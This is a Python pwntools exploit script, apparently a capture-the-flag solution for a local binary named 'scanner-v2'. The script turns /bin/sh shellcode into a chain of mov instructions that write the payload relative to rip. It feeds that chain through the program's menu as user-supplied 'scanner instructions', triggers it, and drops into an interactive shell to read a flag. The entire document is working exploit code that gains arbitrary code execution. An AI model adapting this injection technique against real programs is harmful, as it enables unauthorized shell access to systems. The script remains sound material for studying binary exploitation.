#!/usr/bin/env python3

from pwn import *

binary, host, port = "./scanner-v2", "localhost", 58946

context.update(arch="amd64", os="linux")
context.terminal = ["tmux", "splitw", "-h"]

context.binary = elf = ELF(binary, checksec=False)
if args.REMOTE:
    p = remote(host, port)
else:
    p = process(elf.path, aslr=False)


def enter_choice(choice: int):
    p.sendlineafter(b"Enter your choice: ", str(choice).encode())


def generate_scanner_instructions() -> bytes:
    MOVABS_LEN = 10
    MOVQ_LEN = 7

    shellcode = asm(shellcraft.sh())
    len_shellcode = len(shellcode)
    mov_needed = len_shellcode // 8
    movs = []

    for i in range(mov_needed):
        movs.append(f"mov rax, 0x{shellcode[i * 8 : i * 8 + 8][::-1].hex()}")
        movs.append(
            f"mov [rip+{(mov_needed - 1 - i) * (MOVABS_LEN + MOVQ_LEN) + i * 8}], rax"
        )
    return asm("\n".join(movs))


def main():
    USER_DEFINED_DRIVER = 3
    scanner_instructions = generate_scanner_instructions()
    print(disasm(scanner_instructions))

    enter_choice(3)
    p.sendline(str(len(scanner_instructions)).encode())
    p.sendline(scanner_instructions)
    enter_choice(2)
    p.sendline(str(USER_DEFINED_DRIVER).encode())
    enter_choice(1)
    # p.send(b"cat flag.txt")

    p.interactive()


if __name__ == "__main__":
    main()
